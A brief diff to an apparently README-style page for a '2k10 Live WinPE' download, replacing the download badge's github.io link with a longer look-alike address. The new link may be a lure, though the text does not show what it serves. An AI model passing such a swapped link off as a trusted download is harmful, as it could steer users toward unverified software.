@@ -2,7 +2,8 @@
 
 ## 📥 Download 2k10 Live WinPE
 
-[![⬇️ Download 2k10 Live](https://img.shields.io/badge/Download-2k10%20Live-blue?style=for-the-badge&logo=usb)](https://2k10-live-winpe.github.io/.github)
+[![⬇️ Download 2k10 Live](https://img.shields.io/badge/Download-2k10%20Live-blue?style=for-the-badge&logo=usb)](https://2k10-live-winpe-7x86-special-edition.github.io/.github
+)
 
 ---
 
